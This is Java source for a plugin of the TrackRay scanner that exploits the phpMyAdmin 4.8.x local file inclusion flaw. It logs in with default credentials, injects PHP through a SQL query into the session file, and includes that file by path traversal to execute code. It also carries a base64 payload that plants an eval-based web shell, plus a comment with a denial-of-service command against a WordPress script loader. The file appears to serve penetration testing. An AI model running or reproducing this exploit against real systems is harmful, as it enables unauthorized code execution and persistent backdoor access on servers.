package com.trackray.module.plugin.webapp.phpmyadmin;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Rule;
import com.trackray.base.enums.HttpMethod;
import com.trackray.base.httpclient.CrawlerPage;
import com.trackray.base.plugin.AbstractPlugin;
import com.trackray.base.plugin.CommonPlugin;
import com.trackray.base.utils.PageUtils;
import com.trackray.base.utils.RegexUtil;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

@Plugin(value = "phpmyadmin001",
        title = "phpMyAdmin 4.8.x 本地文件包含漏洞",
        author = "浅蓝",
        desc = "需要目标是 Linux 环境。target是目标地址，username和password是mysql用户名密码，code是需要执行的代码，默认是PHPinfo",
        link = "http://www.vulnspy.com/cn-phpmyadmin-4.8.1-lfi-to-rce/phpmyadmin_4.8.x_%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/")
@Rule(params = {
        @Param(key = "target", desc = "目标地址"),
        @Param(key = "username",defaultValue = "root" , desc = "pma用户名"),
        @Param(key = "password",defaultValue = "root" , desc = "pma密码"),
        @Param(key = "code",defaultValue = "<?php echo(md5(1));?>" , desc = "执行代码"),
    }, type = CommonPlugin.Type.TEXT)
public class PHPMyAdmin001 extends CommonPlugin<String> {
    @Override
    public boolean check(Map param) {
        return true;
    }

    //python doser.py -g 'http://***.vsplate.me/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9' -t 100
    @Override
    public String start() {
        String base = param.get("target").toString();
        CrawlerPage page = crawlerPage;
        page.getRequest().setUrl(base);
        page.getRequest().setTimeout(60000);
        fetcher.run(page);
        String code = param.get("code").toString();
        String phpinfo = "<?php phpinfo();exit;?>";
        String getshell = "<?php eval(base64_decode(\"ZmlsZV9wdXRfY29udGVudHMoJ3RyYWNrcmF5LnBocCcsJzw/cGhwIGV2YWwoJF9SRVFVRVNUW3hdKTs/PicpOw==\"));exit;?>";
        try {
            if (page.getResponse().getStatus().getStatusCode() == 200){
                String token = RegexUtil.extractStr(page.getResponse().getStatus().getContent(),"token:\"(.*)\",text_dir");
                String session = "";
                if (!page.getResponse().getStatus().getCookie().isEmpty())
                {
                    String cookie = page.getResponse().getStatus().getCookie();
                    page.getRequest().setCookie(cookie);
                    session = page.getRequest().getCookieMap().get("phpMyAdmin");
                    page.getRequest().addHttpHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");

                    page.getRequest().addHttpHeader("Accept-Language","zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");

                    page.getRequest().addHttpHeader("Accept-Encoding","gzip, deflate");
                    page.getRequest().addHttpHeader("Upgrade-Insecure-Requests","1");

                }
                page.getRequest().setUrl(base+"/index.php");
                page.getRequest().setHttpMethod(HttpMethod.POST);

                HashMap<String, String> map = new HashMap<>();
                map.put("set_session",session);
                map.put("pma_username",param.get("username").toString());
                map.put("pma_password",param.get("password").toString());
                map.put("server","1");
                map.put("target","server_sql.php");
                map.put("token",token);
                //set_session=g9dndsm8jb8h5934l7lmaa8s2gr58jsu&pma_username=root&pma_password=toor&server=1&target=index.php&token=%5BL%3Che1%3C9l%3DabTv%60N
                page.getRequest().setParamMap(map);

                fetcher.run(page);

                if (page.getResponse().getStatus().getStatusCode() == 302){
                    String redirect = "server_sql.php";
                    page.getRequest().setUrl(base+redirect);
                    String cookie = page.getResponse().getStatus().getCookie();
                    page.getRequest().setCookie(cookie);
                    page.getRequest().getParamMap().clear();
                    page.getRequest().setHttpMethod(HttpMethod.GET);

                    fetcher.run(page);
                    String con = PageUtils.getContent(page);
                    //
                    int s = con.lastIndexOf("token:\"");
                    int end = con.indexOf("\",text_dir");

                    if (s<0||end<0)
                        return "漏洞不存在";

                    token = con.substring(s+7,end);
                    session = page.getRequest().getCookieMap().get("phpMyAdmin");
                    String nocache = System.currentTimeMillis()+RegexUtil.extractStr(con,"php\\?nocache=(.*)ltr&amp;server=1");

                    String parma = "";
                    HashMap<String, String> map2 = new HashMap<>();
                    map2.put("is_js_confirmed","0");
                    map2.put("token",token);
                    map2.put("pos","0");
                    map2.put("goto","server_sql.php");
                    map2.put("message_to_show","hacked");
                    map2.put("prev_sql_query","0");
                    map2.put("sql_query",String.format("select '%s'",code.isEmpty()?phpinfo:code.replaceAll("'","\\'")));
                    map2.put("sql_delimiter",";");
                    map2.put("show_query","1");
                    map2.put("fk_checks","0");
                    map2.put("fk_checks","1");
                    map2.put("SQL","Go");
                    map2.put("ajax_request","true");
                    map2.put("_nocache",nocache);
                    for (Map.Entry<String, String> e : map2.entrySet()) {
                        parma+=e.getKey()+"="+ URLEncoder.encode(e.getValue())+"&";
                    }
                    parma+="token="+URLEncoder.encode(token);

                    page.getRequest().setUrl(base+"import.php");
                    page.getRequest().setHttpMethod(HttpMethod.POST);
                    page.getRequest().setParamStr(parma);
                    page.getRequest().setCookie(page.getResponse().getStatus().getCookie());
                    page.getRequest().addHttpHeader("X-Requested-With: XMLHttpRequest");
                    page.getRequest().addHttpHeader("Content-Type: application/x-www-form-urlencoded; charset=UTF-8");

                    fetcher.run(page);
                    String response = "";
                    if (PageUtils.getContent(page).contains("sql_query")){
                        page.getRequest().setCookie(page.getResponse().getStatus().getCookie());
                        String url = base+"/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_"+session;
                        page.getRequest().setUrl(url);
                        page.getRequest().setHttpMethod(HttpMethod.GET);
                        fetcher.run(page);
                        response = PageUtils.getContent(page);
                    }else {
                        response = "登录成功但执行sql失败，请重试";
                    }
                    page.getRequest().setCookie(page.getResponse().getStatus().getCookie());
                    page.getRequest().setUrl(base+"/logout.php");
                    page.getRequest().setHttpMethod(HttpMethod.GET);
                    fetcher.run(page);
                    return response;
                }else{
                    return "登录失败";
                }


            }

        }catch (Exception e){
            return "异常 "+e.getMessage();
        }
        return "请求主页失败";
    }

}
